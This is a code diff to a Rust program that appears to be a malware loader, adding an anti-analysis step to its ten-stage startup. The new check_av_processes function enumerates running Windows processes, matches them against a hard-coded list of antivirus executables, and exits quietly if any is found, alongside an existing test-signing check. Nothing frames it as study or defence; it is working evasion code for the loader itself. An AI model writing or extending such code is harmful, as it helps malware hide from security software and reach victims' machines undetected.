@@ -70,6 +70,14 @@ fn main() {
 
     // 2. Anti-analysis
     log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
+    if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_av_processes {
+        log!("[4/10] checking av processes...");
+        if check_av_processes() {
+            log!("[4/10] av process detected — exiting immediately");
+            std::process::exit(0);
+        }
+        log!("[4/10] av process check passed");
+    }
     if loader_cfg.anti_analysis.enabled && loader_cfg.anti_analysis.check_test_signing {
         log!("[4/10] checking test signing...");
         if check_test_signing() {
@@ -78,7 +86,8 @@ fn main() {
             std::process::exit(0);
         }
         log!("[4/10] test signing check passed");
-    } else {
+    }
+    if !loader_cfg.anti_analysis.enabled {
         log!("[4/10] anti-analysis disabled, skipping");
     }
 
@@ -410,6 +419,84 @@ fn check_test_signing() -> bool {
             let s = String::from_utf16_lossy(&buf[..end]);
             s.to_lowercase().contains("testsigning")
         }
+    }
+    #[cfg(not(target_os = "windows"))]
+    { false }
+}
+
+// ── Anti-analysis: AV process detection ──────────────────────────────
+
+/// Known AV process names (lowercase for comparison).
+const AV_PROCESSES: &[&str] = &[
+    "_avp32.exe",
+    "_avpcc.exe",
+    "_avpm.exe",
+    "rescue32.exe",
+];
+
+/// Check if any known AV process is running.
+/// Uses CreateToolhelp32Snapshot / Process32FirstW / Process32NextW.
+fn check_av_processes() -> bool {
+    #[cfg(target_os = "windows")]
+    {
+        use std::ffi::c_void;
+
+        extern "system" {
+            fn CreateToolhelp32Snapshot(flags: u32, process_id: u32) -> *mut c_void;
+            fn Process32FirstW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
+            fn Process32NextW(snapshot: *mut c_void, entry: *mut ProcessEntry32W) -> i32;
+            fn CloseHandle(handle: *mut c_void) -> i32;
+        }
+
+        const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+        const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;
+
+        #[repr(C)]
+        struct ProcessEntry32W {
+            dw_size: u32,
+            cnt_usage: u32,
+            th32_process_id: u32,
+            th32_default_heap_id: usize,
+            th32_module_id: u32,
+            cnt_threads: u32,
+            th32_parent_process_id: u32,
+            pc_pri_class_base: i32,
+            dw_flags: u32,
+            sz_exe_file: [u16; 260],
+        }
+
+        unsafe {
+            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if snapshot == INVALID_HANDLE_VALUE {
+                return false;
+            }
+
+            let mut entry: ProcessEntry32W = std::mem::zeroed();
+            entry.dw_size = std::mem::size_of::<ProcessEntry32W>() as u32;
+
+            if Process32FirstW(snapshot, &mut entry) != 0 {
+                loop {
+                    // Find null terminator in sz_exe_file
+                    let end = entry.sz_exe_file.iter().position(|&c| c == 0).unwrap_or(260);
+                    let exe_name = String::from_utf16_lossy(&entry.sz_exe_file[..end]);
+
+                    for av in AV_PROCESSES {
+                        if exe_name.eq_ignore_ascii_case(av) {
+                            log!("[AV] detected process: {} (pid={})", exe_name, entry.th32_process_id);
+                            CloseHandle(snapshot);
+                            return true;
+                        }
+                    }
+
+                    if Process32NextW(snapshot, &mut entry) == 0 {
+                        break;
+                    }
+                }
+            }
+
+            CloseHandle(snapshot);
+        }
+        false
     }
     #[cfg(not(target_os = "windows"))]
     { false }
